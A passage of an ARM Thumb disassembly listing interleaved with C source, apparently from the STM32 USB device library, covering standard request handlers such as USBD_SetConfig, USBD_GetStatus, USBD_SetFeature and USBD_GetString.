 800be48:	4b4d      	ldr	r3, [pc, #308]	; (800bf80 <USBD_SetConfig+0x150>)
 800be4a:	781b      	ldrb	r3, [r3, #0]
 800be4c:	2b01      	cmp	r3, #1
 800be4e:	d905      	bls.n	800be5c <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800be50:	6839      	ldr	r1, [r7, #0]
 800be52:	6878      	ldr	r0, [r7, #4]
 800be54:	f000 f985 	bl	800c162 <USBD_CtlError>
    return USBD_FAIL;
 800be58:	2303      	movs	r3, #3
 800be5a:	e08c      	b.n	800bf76 <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800be5c:	687b      	ldr	r3, [r7, #4]
 800be5e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800be62:	b2db      	uxtb	r3, r3
 800be64:	2b02      	cmp	r3, #2
 800be66:	d002      	beq.n	800be6e <USBD_SetConfig+0x3e>
 800be68:	2b03      	cmp	r3, #3
 800be6a:	d029      	beq.n	800bec0 <USBD_SetConfig+0x90>
 800be6c:	e075      	b.n	800bf5a <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800be6e:	4b44      	ldr	r3, [pc, #272]	; (800bf80 <USBD_SetConfig+0x150>)
 800be70:	781b      	ldrb	r3, [r3, #0]
 800be72:	2b00      	cmp	r3, #0
 800be74:	d020      	beq.n	800beb8 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800be76:	4b42      	ldr	r3, [pc, #264]	; (800bf80 <USBD_SetConfig+0x150>)
 800be78:	781b      	ldrb	r3, [r3, #0]
 800be7a:	461a      	mov	r2, r3
 800be7c:	687b      	ldr	r3, [r7, #4]
 800be7e:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800be80:	4b3f      	ldr	r3, [pc, #252]	; (800bf80 <USBD_SetConfig+0x150>)
 800be82:	781b      	ldrb	r3, [r3, #0]
 800be84:	4619      	mov	r1, r3
 800be86:	6878      	ldr	r0, [r7, #4]
 800be88:	f7ff f848 	bl	800af1c <USBD_SetClassConfig>
 800be8c:	4603      	mov	r3, r0
 800be8e:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800be90:	7bfb      	ldrb	r3, [r7, #15]
 800be92:	2b00      	cmp	r3, #0
 800be94:	d008      	beq.n	800bea8 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800be96:	6839      	ldr	r1, [r7, #0]
 800be98:	6878      	ldr	r0, [r7, #4]
 800be9a:	f000 f962 	bl	800c162 <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800be9e:	687b      	ldr	r3, [r7, #4]
 800bea0:	2202      	movs	r2, #2
 800bea2:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bea6:	e065      	b.n	800bf74 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bea8:	6878      	ldr	r0, [r7, #4]
 800beaa:	f000 fa25 	bl	800c2f8 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800beae:	687b      	ldr	r3, [r7, #4]
 800beb0:	2203      	movs	r2, #3
 800beb2:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800beb6:	e05d      	b.n	800bf74 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800beb8:	6878      	ldr	r0, [r7, #4]
 800beba:	f000 fa1d 	bl	800c2f8 <USBD_CtlSendStatus>
      break;
 800bebe:	e059      	b.n	800bf74 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800bec0:	4b2f      	ldr	r3, [pc, #188]	; (800bf80 <USBD_SetConfig+0x150>)
 800bec2:	781b      	ldrb	r3, [r3, #0]
 800bec4:	2b00      	cmp	r3, #0
 800bec6:	d112      	bne.n	800beee <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bec8:	687b      	ldr	r3, [r7, #4]
 800beca:	2202      	movs	r2, #2
 800becc:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800bed0:	4b2b      	ldr	r3, [pc, #172]	; (800bf80 <USBD_SetConfig+0x150>)
 800bed2:	781b      	ldrb	r3, [r3, #0]
 800bed4:	461a      	mov	r2, r3
 800bed6:	687b      	ldr	r3, [r7, #4]
 800bed8:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800beda:	4b29      	ldr	r3, [pc, #164]	; (800bf80 <USBD_SetConfig+0x150>)
 800bedc:	781b      	ldrb	r3, [r3, #0]
 800bede:	4619      	mov	r1, r3
 800bee0:	6878      	ldr	r0, [r7, #4]
 800bee2:	f7ff f837 	bl	800af54 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800bee6:	6878      	ldr	r0, [r7, #4]
 800bee8:	f000 fa06 	bl	800c2f8 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800beec:	e042      	b.n	800bf74 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800beee:	4b24      	ldr	r3, [pc, #144]	; (800bf80 <USBD_SetConfig+0x150>)
 800bef0:	781b      	ldrb	r3, [r3, #0]
 800bef2:	461a      	mov	r2, r3
 800bef4:	687b      	ldr	r3, [r7, #4]
 800bef6:	685b      	ldr	r3, [r3, #4]
 800bef8:	429a      	cmp	r2, r3
 800befa:	d02a      	beq.n	800bf52 <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800befc:	687b      	ldr	r3, [r7, #4]
 800befe:	685b      	ldr	r3, [r3, #4]
 800bf00:	b2db      	uxtb	r3, r3
 800bf02:	4619      	mov	r1, r3
 800bf04:	6878      	ldr	r0, [r7, #4]
 800bf06:	f7ff f825 	bl	800af54 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800bf0a:	4b1d      	ldr	r3, [pc, #116]	; (800bf80 <USBD_SetConfig+0x150>)
 800bf0c:	781b      	ldrb	r3, [r3, #0]
 800bf0e:	461a      	mov	r2, r3
 800bf10:	687b      	ldr	r3, [r7, #4]
 800bf12:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bf14:	4b1a      	ldr	r3, [pc, #104]	; (800bf80 <USBD_SetConfig+0x150>)
 800bf16:	781b      	ldrb	r3, [r3, #0]
 800bf18:	4619      	mov	r1, r3
 800bf1a:	6878      	ldr	r0, [r7, #4]
 800bf1c:	f7fe fffe 	bl	800af1c <USBD_SetClassConfig>
 800bf20:	4603      	mov	r3, r0
 800bf22:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800bf24:	7bfb      	ldrb	r3, [r7, #15]
 800bf26:	2b00      	cmp	r3, #0
 800bf28:	d00f      	beq.n	800bf4a <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800bf2a:	6839      	ldr	r1, [r7, #0]
 800bf2c:	6878      	ldr	r0, [r7, #4]
 800bf2e:	f000 f918 	bl	800c162 <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf32:	687b      	ldr	r3, [r7, #4]
 800bf34:	685b      	ldr	r3, [r3, #4]
 800bf36:	b2db      	uxtb	r3, r3
 800bf38:	4619      	mov	r1, r3
 800bf3a:	6878      	ldr	r0, [r7, #4]
 800bf3c:	f7ff f80a 	bl	800af54 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf40:	687b      	ldr	r3, [r7, #4]
 800bf42:	2202      	movs	r2, #2
 800bf44:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bf48:	e014      	b.n	800bf74 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bf4a:	6878      	ldr	r0, [r7, #4]
 800bf4c:	f000 f9d4 	bl	800c2f8 <USBD_CtlSendStatus>
      break;
 800bf50:	e010      	b.n	800bf74 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bf52:	6878      	ldr	r0, [r7, #4]
 800bf54:	f000 f9d0 	bl	800c2f8 <USBD_CtlSendStatus>
      break;
 800bf58:	e00c      	b.n	800bf74 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800bf5a:	6839      	ldr	r1, [r7, #0]
 800bf5c:	6878      	ldr	r0, [r7, #4]
 800bf5e:	f000 f900 	bl	800c162 <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bf62:	4b07      	ldr	r3, [pc, #28]	; (800bf80 <USBD_SetConfig+0x150>)
 800bf64:	781b      	ldrb	r3, [r3, #0]
 800bf66:	4619      	mov	r1, r3
 800bf68:	6878      	ldr	r0, [r7, #4]
 800bf6a:	f7fe fff3 	bl	800af54 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800bf6e:	2303      	movs	r3, #3
 800bf70:	73fb      	strb	r3, [r7, #15]
      break;
 800bf72:	bf00      	nop
  }

  return ret;
 800bf74:	7bfb      	ldrb	r3, [r7, #15]
}
 800bf76:	4618      	mov	r0, r3
 800bf78:	3710      	adds	r7, #16
 800bf7a:	46bd      	mov	sp, r7
 800bf7c:	bd80      	pop	{r7, pc}
 800bf7e:	bf00      	nop
 800bf80:	200003bc 	.word	0x200003bc

0800bf84 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bf84:	b580      	push	{r7, lr}
 800bf86:	b082      	sub	sp, #8
 800bf88:	af00      	add	r7, sp, #0
 800bf8a:	6078      	str	r0, [r7, #4]
 800bf8c:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800bf8e:	683b      	ldr	r3, [r7, #0]
 800bf90:	88db      	ldrh	r3, [r3, #6]
 800bf92:	2b01      	cmp	r3, #1
 800bf94:	d004      	beq.n	800bfa0 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800bf96:	6839      	ldr	r1, [r7, #0]
 800bf98:	6878      	ldr	r0, [r7, #4]
 800bf9a:	f000 f8e2 	bl	800c162 <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800bf9e:	e023      	b.n	800bfe8 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800bfa0:	687b      	ldr	r3, [r7, #4]
 800bfa2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bfa6:	b2db      	uxtb	r3, r3
 800bfa8:	2b02      	cmp	r3, #2
 800bfaa:	dc02      	bgt.n	800bfb2 <USBD_GetConfig+0x2e>
 800bfac:	2b00      	cmp	r3, #0
 800bfae:	dc03      	bgt.n	800bfb8 <USBD_GetConfig+0x34>
 800bfb0:	e015      	b.n	800bfde <USBD_GetConfig+0x5a>
 800bfb2:	2b03      	cmp	r3, #3
 800bfb4:	d00b      	beq.n	800bfce <USBD_GetConfig+0x4a>
 800bfb6:	e012      	b.n	800bfde <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800bfb8:	687b      	ldr	r3, [r7, #4]
 800bfba:	2200      	movs	r2, #0
 800bfbc:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800bfbe:	687b      	ldr	r3, [r7, #4]
 800bfc0:	3308      	adds	r3, #8
 800bfc2:	2201      	movs	r2, #1
 800bfc4:	4619      	mov	r1, r3
 800bfc6:	6878      	ldr	r0, [r7, #4]
 800bfc8:	f000 f93c 	bl	800c244 <USBD_CtlSendData>
        break;
 800bfcc:	e00c      	b.n	800bfe8 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800bfce:	687b      	ldr	r3, [r7, #4]
 800bfd0:	3304      	adds	r3, #4
 800bfd2:	2201      	movs	r2, #1
 800bfd4:	4619      	mov	r1, r3
 800bfd6:	6878      	ldr	r0, [r7, #4]
 800bfd8:	f000 f934 	bl	800c244 <USBD_CtlSendData>
        break;
 800bfdc:	e004      	b.n	800bfe8 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800bfde:	6839      	ldr	r1, [r7, #0]
 800bfe0:	6878      	ldr	r0, [r7, #4]
 800bfe2:	f000 f8be 	bl	800c162 <USBD_CtlError>
        break;
 800bfe6:	bf00      	nop
}
 800bfe8:	bf00      	nop
 800bfea:	3708      	adds	r7, #8
 800bfec:	46bd      	mov	sp, r7
 800bfee:	bd80      	pop	{r7, pc}

0800bff0 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bff0:	b580      	push	{r7, lr}
 800bff2:	b082      	sub	sp, #8
 800bff4:	af00      	add	r7, sp, #0
 800bff6:	6078      	str	r0, [r7, #4]
 800bff8:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800bffa:	687b      	ldr	r3, [r7, #4]
 800bffc:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c000:	b2db      	uxtb	r3, r3
 800c002:	3b01      	subs	r3, #1
 800c004:	2b02      	cmp	r3, #2
 800c006:	d81e      	bhi.n	800c046 <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c008:	683b      	ldr	r3, [r7, #0]
 800c00a:	88db      	ldrh	r3, [r3, #6]
 800c00c:	2b02      	cmp	r3, #2
 800c00e:	d004      	beq.n	800c01a <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c010:	6839      	ldr	r1, [r7, #0]
 800c012:	6878      	ldr	r0, [r7, #4]
 800c014:	f000 f8a5 	bl	800c162 <USBD_CtlError>
        break;
 800c018:	e01a      	b.n	800c050 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c01a:	687b      	ldr	r3, [r7, #4]
 800c01c:	2201      	movs	r2, #1
 800c01e:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c020:	687b      	ldr	r3, [r7, #4]
 800c022:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c026:	2b00      	cmp	r3, #0
 800c028:	d005      	beq.n	800c036 <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c02a:	687b      	ldr	r3, [r7, #4]
 800c02c:	68db      	ldr	r3, [r3, #12]
 800c02e:	f043 0202 	orr.w	r2, r3, #2
 800c032:	687b      	ldr	r3, [r7, #4]
 800c034:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c036:	687b      	ldr	r3, [r7, #4]
 800c038:	330c      	adds	r3, #12
 800c03a:	2202      	movs	r2, #2
 800c03c:	4619      	mov	r1, r3
 800c03e:	6878      	ldr	r0, [r7, #4]
 800c040:	f000 f900 	bl	800c244 <USBD_CtlSendData>
      break;
 800c044:	e004      	b.n	800c050 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c046:	6839      	ldr	r1, [r7, #0]
 800c048:	6878      	ldr	r0, [r7, #4]
 800c04a:	f000 f88a 	bl	800c162 <USBD_CtlError>
      break;
 800c04e:	bf00      	nop
  }
}
 800c050:	bf00      	nop
 800c052:	3708      	adds	r7, #8
 800c054:	46bd      	mov	sp, r7
 800c056:	bd80      	pop	{r7, pc}

0800c058 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c058:	b580      	push	{r7, lr}
 800c05a:	b082      	sub	sp, #8
 800c05c:	af00      	add	r7, sp, #0
 800c05e:	6078      	str	r0, [r7, #4]
 800c060:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c062:	683b      	ldr	r3, [r7, #0]
 800c064:	885b      	ldrh	r3, [r3, #2]
 800c066:	2b01      	cmp	r3, #1
 800c068:	d107      	bne.n	800c07a <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c06a:	687b      	ldr	r3, [r7, #4]
 800c06c:	2201      	movs	r2, #1
 800c06e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c072:	6878      	ldr	r0, [r7, #4]
 800c074:	f000 f940 	bl	800c2f8 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c078:	e013      	b.n	800c0a2 <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c07a:	683b      	ldr	r3, [r7, #0]
 800c07c:	885b      	ldrh	r3, [r3, #2]
 800c07e:	2b02      	cmp	r3, #2
 800c080:	d10b      	bne.n	800c09a <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c082:	683b      	ldr	r3, [r7, #0]
 800c084:	889b      	ldrh	r3, [r3, #4]
 800c086:	0a1b      	lsrs	r3, r3, #8
 800c088:	b29b      	uxth	r3, r3
 800c08a:	b2da      	uxtb	r2, r3
 800c08c:	687b      	ldr	r3, [r7, #4]
 800c08e:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c092:	6878      	ldr	r0, [r7, #4]
 800c094:	f000 f930 	bl	800c2f8 <USBD_CtlSendStatus>
}
 800c098:	e003      	b.n	800c0a2 <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c09a:	6839      	ldr	r1, [r7, #0]
 800c09c:	6878      	ldr	r0, [r7, #4]
 800c09e:	f000 f860 	bl	800c162 <USBD_CtlError>
}
 800c0a2:	bf00      	nop
 800c0a4:	3708      	adds	r7, #8
 800c0a6:	46bd      	mov	sp, r7
 800c0a8:	bd80      	pop	{r7, pc}

0800c0aa <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c0aa:	b580      	push	{r7, lr}
 800c0ac:	b082      	sub	sp, #8
 800c0ae:	af00      	add	r7, sp, #0
 800c0b0:	6078      	str	r0, [r7, #4]
 800c0b2:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c0b4:	687b      	ldr	r3, [r7, #4]
 800c0b6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c0ba:	b2db      	uxtb	r3, r3
 800c0bc:	3b01      	subs	r3, #1
 800c0be:	2b02      	cmp	r3, #2
 800c0c0:	d80b      	bhi.n	800c0da <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c0c2:	683b      	ldr	r3, [r7, #0]
 800c0c4:	885b      	ldrh	r3, [r3, #2]
 800c0c6:	2b01      	cmp	r3, #1
 800c0c8:	d10c      	bne.n	800c0e4 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c0ca:	687b      	ldr	r3, [r7, #4]
 800c0cc:	2200      	movs	r2, #0
 800c0ce:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c0d2:	6878      	ldr	r0, [r7, #4]
 800c0d4:	f000 f910 	bl	800c2f8 <USBD_CtlSendStatus>
      }
      break;
 800c0d8:	e004      	b.n	800c0e4 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c0da:	6839      	ldr	r1, [r7, #0]
 800c0dc:	6878      	ldr	r0, [r7, #4]
 800c0de:	f000 f840 	bl	800c162 <USBD_CtlError>
      break;
 800c0e2:	e000      	b.n	800c0e6 <USBD_ClrFeature+0x3c>
      break;
 800c0e4:	bf00      	nop
  }
}
 800c0e6:	bf00      	nop
 800c0e8:	3708      	adds	r7, #8
 800c0ea:	46bd      	mov	sp, r7
 800c0ec:	bd80      	pop	{r7, pc}

0800c0ee <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c0ee:	b580      	push	{r7, lr}
 800c0f0:	b084      	sub	sp, #16
 800c0f2:	af00      	add	r7, sp, #0
 800c0f4:	6078      	str	r0, [r7, #4]
 800c0f6:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c0f8:	683b      	ldr	r3, [r7, #0]
 800c0fa:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c0fc:	68fb      	ldr	r3, [r7, #12]
 800c0fe:	781a      	ldrb	r2, [r3, #0]
 800c100:	687b      	ldr	r3, [r7, #4]
 800c102:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c104:	68fb      	ldr	r3, [r7, #12]
 800c106:	3301      	adds	r3, #1
 800c108:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c10a:	68fb      	ldr	r3, [r7, #12]
 800c10c:	781a      	ldrb	r2, [r3, #0]
 800c10e:	687b      	ldr	r3, [r7, #4]
 800c110:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c112:	68fb      	ldr	r3, [r7, #12]
 800c114:	3301      	adds	r3, #1
 800c116:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c118:	68f8      	ldr	r0, [r7, #12]
 800c11a:	f7ff fa16 	bl	800b54a <SWAPBYTE>
 800c11e:	4603      	mov	r3, r0
 800c120:	461a      	mov	r2, r3
 800c122:	687b      	ldr	r3, [r7, #4]
 800c124:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c126:	68fb      	ldr	r3, [r7, #12]
 800c128:	3301      	adds	r3, #1
 800c12a:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c12c:	68fb      	ldr	r3, [r7, #12]
 800c12e:	3301      	adds	r3, #1
 800c130:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c132:	68f8      	ldr	r0, [r7, #12]
 800c134:	f7ff fa09 	bl	800b54a <SWAPBYTE>
 800c138:	4603      	mov	r3, r0
 800c13a:	461a      	mov	r2, r3
 800c13c:	687b      	ldr	r3, [r7, #4]
 800c13e:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c140:	68fb      	ldr	r3, [r7, #12]
 800c142:	3301      	adds	r3, #1
 800c144:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c146:	68fb      	ldr	r3, [r7, #12]
 800c148:	3301      	adds	r3, #1
 800c14a:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c14c:	68f8      	ldr	r0, [r7, #12]
 800c14e:	f7ff f9fc 	bl	800b54a <SWAPBYTE>
 800c152:	4603      	mov	r3, r0
 800c154:	461a      	mov	r2, r3
 800c156:	687b      	ldr	r3, [r7, #4]
 800c158:	80da      	strh	r2, [r3, #6]
}
 800c15a:	bf00      	nop
 800c15c:	3710      	adds	r7, #16
 800c15e:	46bd      	mov	sp, r7
 800c160:	bd80      	pop	{r7, pc}

0800c162 <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c162:	b580      	push	{r7, lr}
 800c164:	b082      	sub	sp, #8
 800c166:	af00      	add	r7, sp, #0
 800c168:	6078      	str	r0, [r7, #4]
 800c16a:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c16c:	2180      	movs	r1, #128	; 0x80
 800c16e:	6878      	ldr	r0, [r7, #4]
 800c170:	f000 fd6a 	bl	800cc48 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c174:	2100      	movs	r1, #0
 800c176:	6878      	ldr	r0, [r7, #4]
 800c178:	f000 fd66 	bl	800cc48 <USBD_LL_StallEP>
}
 800c17c:	bf00      	nop
 800c17e:	3708      	adds	r7, #8
 800c180:	46bd      	mov	sp, r7
 800c182:	bd80      	pop	{r7, pc}

0800c184 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c184:	b580      	push	{r7, lr}
 800c186:	b086      	sub	sp, #24
 800c188:	af00      	add	r7, sp, #0
 800c18a:	60f8      	str	r0, [r7, #12]
 800c18c:	60b9      	str	r1, [r7, #8]
 800c18e:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c190:	2300      	movs	r3, #0
 800c192:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c194:	68fb      	ldr	r3, [r7, #12]
 800c196:	2b00      	cmp	r3, #0
 800c198:	d036      	beq.n	800c208 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c19a:	68fb      	ldr	r3, [r7, #12]
 800c19c:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c19e:	6938      	ldr	r0, [r7, #16]
 800c1a0:	f000 f836 	bl	800c210 <USBD_GetLen>
 800c1a4:	4603      	mov	r3, r0
 800c1a6:	3301      	adds	r3, #1
 800c1a8:	b29b      	uxth	r3, r3
 800c1aa:	005b      	lsls	r3, r3, #1
 800c1ac:	b29a      	uxth	r2, r3
 800c1ae:	687b      	ldr	r3, [r7, #4]
 800c1b0:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c1b2:	7dfb      	ldrb	r3, [r7, #23]
 800c1b4:	68ba      	ldr	r2, [r7, #8]
 800c1b6:	4413      	add	r3, r2
 800c1b8:	687a      	ldr	r2, [r7, #4]
 800c1ba:	7812      	ldrb	r2, [r2, #0]
 800c1bc:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1be:	7dfb      	ldrb	r3, [r7, #23]
 800c1c0:	3301      	adds	r3, #1
 800c1c2:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c1c4:	7dfb      	ldrb	r3, [r7, #23]
 800c1c6:	68ba      	ldr	r2, [r7, #8]
 800c1c8:	4413      	add	r3, r2
 800c1ca:	2203      	movs	r2, #3
 800c1cc:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1ce:	7dfb      	ldrb	r3, [r7, #23]
 800c1d0:	3301      	adds	r3, #1
 800c1d2:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c1d4:	e013      	b.n	800c1fe <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c1d6:	7dfb      	ldrb	r3, [r7, #23]
 800c1d8:	68ba      	ldr	r2, [r7, #8]
 800c1da:	4413      	add	r3, r2
 800c1dc:	693a      	ldr	r2, [r7, #16]
 800c1de:	7812      	ldrb	r2, [r2, #0]
 800c1e0:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c1e2:	693b      	ldr	r3, [r7, #16]
 800c1e4:	3301      	adds	r3, #1
 800c1e6:	613b      	str	r3, [r7, #16]
    idx++;
 800c1e8:	7dfb      	ldrb	r3, [r7, #23]
 800c1ea:	3301      	adds	r3, #1
 800c1ec:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c1ee:	7dfb      	ldrb	r3, [r7, #23]
 800c1f0:	68ba      	ldr	r2, [r7, #8]
 800c1f2:	4413      	add	r3, r2
 800c1f4:	2200      	movs	r2, #0
 800c1f6:	701a      	strb	r2, [r3, #0]
    idx++;
 800c1f8:	7dfb      	ldrb	r3, [r7, #23]
 800c1fa:	3301      	adds	r3, #1
 800c1fc:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c1fe:	693b      	ldr	r3, [r7, #16]
 800c200:	781b      	ldrb	r3, [r3, #0]
 800c202:	2b00      	cmp	r3, #0
 800c204:	d1e7      	bne.n	800c1d6 <USBD_GetString+0x52>
 800c206:	e000      	b.n	800c20a <USBD_GetString+0x86>
    return;
 800c208:	bf00      	nop
  }
}
 800c20a:	3718      	adds	r7, #24
 800c20c:	46bd      	mov	sp, r7
 800c20e:	bd80      	pop	{r7, pc}

0800c210 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c210:	b480      	push	{r7}
 800c212:	b085      	sub	sp, #20
 800c214:	af00      	add	r7, sp, #0
 800c216:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c218:	2300      	movs	r3, #0
 800c21a:	73fb      	strb	r3, [r7, #15]
